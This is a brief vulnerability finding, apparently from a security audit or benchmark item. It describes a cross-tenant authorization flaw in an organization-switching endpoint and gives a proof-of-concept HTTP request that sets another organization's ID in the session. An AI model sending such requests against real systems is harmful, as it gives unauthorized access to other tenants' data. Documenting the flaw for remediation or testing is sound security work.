diagnosis: switch_active_organization takes an arbitrary organization_id and stores it as the active organization in the caller's session without verifying that request.user is a registered member of the target Organization. Subsequent requests that rely on request.session['active_organization_id'] to scope database queries will operate under the context of the targeted victim organization.
exploit_request:
POST /api/organizations/switch/ HTTP/1.1
Host: cloud.enterprise-crm.com
Authorization: Bearer regular_authenticated_user
Content-Type: application/json

{
  "organization_id": 105
}
